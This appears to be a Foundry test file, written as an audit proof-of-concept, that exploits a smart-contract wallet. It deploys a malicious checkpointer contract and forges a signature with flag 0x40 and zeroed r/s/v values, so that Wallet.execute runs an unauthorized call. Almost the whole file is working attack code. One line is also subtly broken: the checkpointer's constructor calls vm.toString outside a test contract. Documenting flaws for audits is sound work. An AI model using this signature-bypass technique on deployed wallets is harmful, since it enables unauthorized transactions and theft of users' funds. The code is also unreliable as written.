// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "test/integrations/extensions/sessions/ExtendedSessionTestBase.sol";
import "../src/modules/Payload.sol";

// ATTACK TIMELINE:
// 1. [Setup] Deploy MaliciousCheckpointer and ExploitTarget contracts
// 2. [T=0] Attacker creates a Wallet and crafts a payload targeting ExploitTarget
// 3. [T=1] Attacker forges a signature with flag 0x40 and embeds MaliciousCheckpointer address
// 4. [T=2] Attacker calls Wallet.execute() with the forged signature
// 5. [Assert] Verify ExploitTarget.wasCalled() is true, proving signature verification bypass

contract MaliciousCheckpointer {
    bytes32 public fakeImageHash;
    uint256 public fakeWeight;

    constructor(bytes32 _imageHash, uint256 _weight) {
        console.log("MaliciousCheckpointer constructor called");
        console.log("fakeImageHash:", vm.toString(_imageHash));
        console.log("fakeWeight:", _weight);
        fakeImageHash = _imageHash;
        fakeWeight = _weight;
    }

    fallback() external payable {
        console.log("MaliciousCheckpointer fallback called");
        bytes32 img = fakeImageHash;
        uint256 w = fakeWeight;
        assembly {
            mstore(0x00, img)
            mstore(0x20, w)
            return(0x00, 0x40)
        }
    }

    receive() external payable {
        console.log("MaliciousCheckpointer receive called");
    }
}

contract ExploitTarget {
    bool public wasCalled;

    fallback() external payable {
        console.log("ExploitTarget fallback called - setting wasCalled to true");
        wasCalled = true;
    }

    receive() external payable {
        console.log("ExploitTarget receive called - setting wasCalled to true");
        wasCalled = true;
    }
}

contract AuditAgentPoC is ExtendedSessionTestBase {
    function test_exploit() public {
        console.log("=== Starting test_exploit ===");
        console.log("Initial block.timestamp:", block.timestamp);

        // Fix: Set the missing environment variable expected by the base test setup
        console.log("Setting SEQ_SDK_RPC_MIN_PORT env var");
        vm.setEnv("SEQ_SDK_RPC_MIN_PORT", "8545");

        // 1. Setup: Create Wallet and deploy exploit target
        console.log("Before _createDefaultTopology, timestamp:", block.timestamp);
        string memory topology = _createDefaultTopology();
        console.log("After _createDefaultTopology, timestamp:", block.timestamp);

        console.log("Before _createWallet, timestamp:", block.timestamp);
        (Stage1Module Wallet, string memory config, bytes32 imageHash) = _createWallet(topology);
        console.log("After _createWallet, timestamp:", block.timestamp);
        console.log("Wallet address:", address(Wallet));
        console.log("ImageHash:", vm.toString(imageHash));

        console.log("Before deploying ExploitTarget, timestamp:", block.timestamp);
        ExploitTarget target = new ExploitTarget();
        console.log("After deploying ExploitTarget, address:", address(target));

        // 2. Craft payload
        console.log("Before _buildPayload, timestamp:", block.timestamp);
        Payload.Decoded memory payload = _buildPayload(1);
        console.log("After _buildPayload, timestamp:", block.timestamp);

        payload.calls[0].to = address(target);
        payload.calls[0].value = 0;
        payload.calls[0].data = "";
        console.log("Payload target set to:", address(target));

        console.log("Before toPackedPayload, timestamp:", block.timestamp);
        bytes memory packedPayload = PrimitivesRPC.toPackedPayload(vm, payload);
        console.log("After toPackedPayload, length:", packedPayload.length);

        // 3. Deploy malicious checkpointer that returns valid imageHash and high weight
        console.log("Before deploying MaliciousCheckpointer, timestamp:", block.timestamp);
        MaliciousCheckpointer maliciousCP = new MaliciousCheckpointer(imageHash, 1000);
        console.log("After deploying MaliciousCheckpointer, address:", address(maliciousCP));

        // 4. Forge signature: flag 0x40 (checkpointer present) + malicious checkpointer address
        // The checkpointer address is NOT part of the signed opHash, allowing this substitution
        console.log("Before forging signature, timestamp:", block.timestamp);
        bytes memory forgedSignature = abi.encodePacked(
            uint8(0x40),           // Flag byte: bit 6 set indicates checkpointer address follows
            address(maliciousCP),  // Malicious checkpointer address (not covered by signature hash)
            bytes32(0),            // Fake r
            bytes32(0),            // Fake s
            uint8(0)               // Fake v
        );
        console.log("After forging signature, length:", forgedSignature.length);

        // Wrap in expected signature format
        string memory signatures = string(abi.encodePacked(
            "0x0000000000000000000000000000000000000000:sapient:0x",
            vm.toString(forgedSignature)
        ));
        console.log("Before toEncodedSignature, timestamp:", block.timestamp);
        bytes memory encodedSignature = PrimitivesRPC.toEncodedSignature(vm, config, signatures, false);
        console.log("After toEncodedSignature, length:", encodedSignature.length);

        // 5. Execute: Should revert with invalid signature, but succeeds due to checkpointer bypass
        console.log("Before Wallet.execute, timestamp:", block.timestamp);
        console.log("Pranking entryPoint address:", address(entryPoint));
        vm.prank(address(entryPoint));
        Wallet.execute(packedPayload, encodedSignature);
        console.log("After Wallet.execute, timestamp:", block.timestamp);

        // 6. Assert: Target was called, proving unauthorized execution
        console.log("Checking target.wasCalled() state");
        bool called = target.wasCalled();
        console.log("target.wasCalled() result:", uint256(called ? 1 : 0));
        assertTrue(called, "Exploit failed: payload was not executed");
        console.log("=== Test completed successfully ===");
    }
}
